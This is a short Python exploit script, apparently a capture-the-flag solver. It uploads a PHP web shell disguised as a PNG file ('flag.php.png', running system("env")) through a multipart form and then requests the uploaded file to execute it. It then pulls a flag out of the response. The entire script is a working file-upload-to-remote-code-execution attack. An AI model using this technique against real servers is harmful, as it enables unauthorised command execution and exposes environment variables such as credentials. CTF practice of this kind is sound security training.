from tool.base import match_flag, process_with
from tool.http_repeater import repeater


def run(target: tuple[str, int]):
    exp1 = f"""POST / HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0D40XjlvATyK4piu
Content-Length: 597

------WebKitFormBoundary0D40XjlvATyK4piu
Content-Disposition: form-data; name="file_upload"; filename="flag.php.png"
Content-Type: image/png

<?php system("env")?>
------WebKitFormBoundary0D40XjlvATyK4piu--

"""

    exp2 = f"""GET /uploadfiles/flag.php.png HTTP/1.1
Host: {target[0]}:{target[1]}

"""

    exps = [exp1, exp2]
    resp = None
    for e in exps:
        resp = repeater(e)
        if not resp:
            return False, "", resp.error

    if not resp:
        return False, "", "no response"

    flag = match_flag(resp.text())
    if not flag:
        print(resp.text())
        return False, "", "flag匹配失败"

    return True, flag, ""


def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    main(" 192.168.192.148:53662")
